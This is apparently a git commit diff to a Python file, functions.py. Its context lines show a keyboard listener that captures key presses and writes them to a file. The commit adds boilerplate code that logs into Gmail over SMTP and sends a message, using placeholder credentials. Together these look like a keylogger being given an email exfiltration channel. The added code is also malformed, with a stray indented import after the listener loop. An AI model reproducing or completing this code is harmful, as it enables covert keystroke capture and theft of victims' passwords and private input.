3ee59a7aafea29284e4e2baeb5327b2c50e1cca4
VadAxel <58472614+VadAxel@users.noreply.github.com>
2023-03-12 15:06:44 +0100

    u

--- functions.py
+++ functions.py
@@ -113,3 +113,24 @@ def write_file(tangs):
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+
+    import smtplib
+
+# creates SMTP session
+s = smtplib.SMTP('smtp.gmail.com', 587)
+
+# start TLS for security
+s.starttls()
+
+# Authentication
+s.login("sender_email_id", "sender_email_id_password")
+
+# message to be sent
+message = "Message_you_need_to_send"
+
+# sending the mail
+s.sendmail("sender_email_id", "receiver_email_id", message)
+
+# terminating the session
+s.quit()
